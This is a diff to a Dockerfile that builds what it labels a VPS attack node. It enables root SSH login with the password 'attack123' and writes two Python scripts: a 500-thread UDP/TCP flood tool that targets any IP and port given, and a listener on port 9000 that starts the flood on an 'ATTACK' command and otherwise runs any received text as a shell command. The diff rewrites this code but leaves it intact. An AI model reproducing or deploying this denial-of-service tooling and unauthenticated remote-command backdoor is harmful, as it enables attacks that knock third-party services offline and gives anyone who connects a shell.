@@ -5,66 +5,75 @@ RUN apt update && apt install -y python3 openssh-server netcat-openbsd wget curl
 RUN echo 'root:attack123' | chpasswd
 RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
 RUN sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-RUN service ssh start
 
-RUN mkdir /app
+RUN mkdir -p /app
 WORKDIR /app
 
-# DDoS attack script pre-loaded
-RUN echo 'import socket,threading,time,random,sys' > attack.py
-RUN echo 'target_ip = sys.argv[1]' >> attack.py
-RUN echo 'target_port = int(sys.argv[2])' >> attack.py
-RUN echo 'THREADS = 500' >> attack.py
-RUN echo 'DURATION = 300' >> attack.py
-RUN echo 'stop_flag = False' >> attack.py
-RUN echo 'pkt = [0]' >> attack.py
-RUN echo 'payload = random._urandom(65507)' >> attack.py
-RUN echo 'def udp():' >> attack.py
-RUN echo '    while not stop_flag:' >> attack.py
-RUN echo '        try:' >> attack.py
-RUN echo '            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)' >> attack.py
-RUN echo '            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)' >> attack.py
-RUN echo '            for _ in range(100):' >> attack.py
-RUN echo '                s.sendto(payload, (target_ip, target_port))' >> attack.py
-RUN echo '                pkt[0] += 1' >> attack.py
-RUN echo '            s.close()' >> attack.py
-RUN echo '        except: pass' >> attack.py
-RUN echo 'def tcp():' >> attack.py
-RUN echo '    while not stop_flag:' >> attack.py
-RUN echo '        try:' >> attack.py
-RUN echo '            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> attack.py
-RUN echo '            s.settimeout(0.01)' >> attack.py
-RUN echo '            s.connect_ex((target_ip, target_port))' >> attack.py
-RUN echo '            s.send(b"\x00"*65500)' >> attack.py
-RUN echo '            pkt[0] += 1' >> attack.py
-RUN echo '            s.close()' >> attack.py
-RUN echo '        except: pass' >> attack.py
-RUN echo 'for i in range(THREADS):' >> attack.py
-RUN echo '    threading.Thread(target=udp if i%2==0 else tcp, daemon=True).start()' >> attack.py
-RUN echo 'start = time.time()' >> attack.py
-RUN echo 'while time.time() - start < DURATION:' >> attack.py
-RUN echo '    time.sleep(1)' >> attack.py
-RUN echo '    print(pkt[0])' >> attack.py
-RUN echo 'stop_flag = True' >> attack.py
+RUN printf 'import socket,threading,time,random,sys\n' > attack.py
+RUN printf 'target_ip = sys.argv[1]\n' >> attack.py
+RUN printf 'target_port = int(sys.argv[2])\n' >> attack.py
+RUN printf 'THREADS = 500\n' >> attack.py
+RUN printf 'DURATION = 300\n' >> attack.py
+RUN printf 'stop_flag = False\n' >> attack.py
+RUN printf 'pkt = [0]\n' >> attack.py
+RUN printf 'payload = random._urandom(65507)\n' >> attack.py
+RUN printf 'def udp():\n' >> attack.py
+RUN printf '    while not stop_flag:\n' >> attack.py
+RUN printf '        try:\n' >> attack.py
+RUN printf '            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n' >> attack.py
+RUN printf '            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)\n' >> attack.py
+RUN printf '            for _ in range(100):\n' >> attack.py
+RUN printf '                s.sendto(payload, (target_ip, target_port))\n' >> attack.py
+RUN printf '                pkt[0] += 1\n' >> attack.py
+RUN printf '            s.close()\n' >> attack.py
+RUN printf '        except: pass\n' >> attack.py
+RUN printf 'def tcp():\n' >> attack.py
+RUN printf '    while not stop_flag:\n' >> attack.py
+RUN printf '        try:\n' >> attack.py
+RUN printf '            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n' >> attack.py
+RUN printf '            s.settimeout(0.01)\n' >> attack.py
+RUN printf '            s.connect_ex((target_ip, target_port))\n' >> attack.py
+RUN printf '            s.send(b"\\x00"*65500)\n' >> attack.py
+RUN printf '            pkt[0] += 1\n' >> attack.py
+RUN printf '            s.close()\n' >> attack.py
+RUN printf '        except: pass\n' >> attack.py
+RUN printf 'for i in range(THREADS):\n' >> attack.py
+RUN printf '    threading.Thread(target=udp if i%%2==0 else tcp, daemon=True).start()\n' >> attack.py
+RUN printf 'start = time.time()\n' >> attack.py
+RUN printf 'while time.time() - start < DURATION:\n' >> attack.py
+RUN printf '    time.sleep(1)\n' >> attack.py
+RUN printf '    print(pkt[0])\n' >> attack.py
+RUN printf 'stop_flag = True\n' >> attack.py
+RUN printf 'print("DONE:", pkt[0])\n' >> attack.py
 
-# Remote control endpoint
-RUN echo 'import socket,subprocess' > listen.py
-RUN echo 's=socket.socket()' >> listen.py
-RUN echo 's.bind(("0.0.0.0", 9000))' >> listen.py
-RUN echo 's.listen(1)' >> listen.py
-RUN echo 'print("[READY] VPS listening on port 9000")' >> listen.py
-RUN echo 'while True:' >> listen.py
-RUN echo '    c,a=s.accept()' >> listen.py
-RUN echo '    print(f"Connected: {a}")' >> listen.py
-RUN echo '    data=c.recv(1024).decode().strip()' >> listen.py
-RUN echo '    if data.startswith("ATTACK"):' >> listen.py
-RUN echo '        _,ip,port=data.split()' >> listen.py
-RUN echo '        subprocess.Popen(["python3","/app/attack.py",ip,port])' >> listen.py
-RUN echo '        c.send(b"[+] ATTACK STARTED\n")' >> listen.py
-RUN echo '    else:' >> listen.py
-RUN echo '        out=subprocess.check_output(data,shell=True,stderr=subprocess.STDOUT)' >> listen.py
-RUN echo '        c.send(out)' >> listen.py
-RUN echo '    c.close()' >> listen.py
+RUN printf 'import socket,subprocess\n' > listen.py
+RUN printf 's=socket.socket()\n' >> listen.py
+RUN printf 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n' >> listen.py
+RUN printf 's.bind(("0.0.0.0", 9000))\n' >> listen.py
+RUN printf 's.listen(5)\n' >> listen.py
+RUN printf 'print("[READY] VPS listening on port 9000")\n' >> listen.py
+RUN printf 'while True:\n' >> listen.py
+RUN printf '    try:\n' >> listen.py
+RUN printf '        c,a=s.accept()\n' >> listen.py
+RUN printf '        print("Connected:", a)\n' >> listen.py
+RUN printf '        data=c.recv(1024).decode().strip()\n' >> listen.py
+RUN printf '        if data.startswith("ATTACK"):\n' >> listen.py
+RUN printf '            parts=data.split()\n' >> listen.py
+RUN printf '            if len(parts)==3:\n' >> listen.py
+RUN printf '                _,ip,port=parts\n' >> listen.py
+RUN printf '                subprocess.Popen(["python3","/app/attack.py",ip,port])\n' >> listen.py
+RUN printf '                c.send(b"ATTACK STARTED\\n")\n' >> listen.py
+RUN printf '            else:\n' >> listen.py
+RUN printf '                c.send(b"Usage: ATTACK <ip> <port>\\n")\n' >> listen.py
+RUN printf '        else:\n' >> listen.py
+RUN printf '            try:\n' >> listen.py
+RUN printf '                out=subprocess.check_output(data,shell=True,stderr=subprocess.STDOUT,timeout=10)\n' >> listen.py
+RUN printf '                c.send(out)\n' >> listen.py
+RUN printf '            except Exception as e:\n' >> listen.py
+RUN printf '                c.send(str(e).encode())\n' >> listen.py
+RUN printf '        c.close()\n' >> listen.py
+RUN printf '    except Exception as e:\n' >> listen.py
+RUN printf '        print("Error:", e)\n' >> listen.py
 
 EXPOSE 9000
 EXPOSE 22
